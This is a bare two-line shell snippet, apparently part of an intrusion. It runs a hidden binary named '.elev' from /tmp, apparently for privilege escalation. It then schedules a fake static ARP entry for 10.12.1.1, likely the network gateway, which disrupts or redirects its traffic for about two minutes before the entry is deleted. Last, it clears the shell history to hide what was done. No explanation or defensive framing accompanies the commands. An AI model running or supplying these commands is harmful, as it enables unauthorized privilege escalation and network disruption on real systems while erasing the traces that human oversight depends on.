cd / && /tmp/./.elev
echo "arp -s 10.12.1.1 AA:AA:AA:AA:AA:AA" | at -m now + 2 minute && echo "arp -d 10.12.1.1" | at -m now + 4 minute && history -c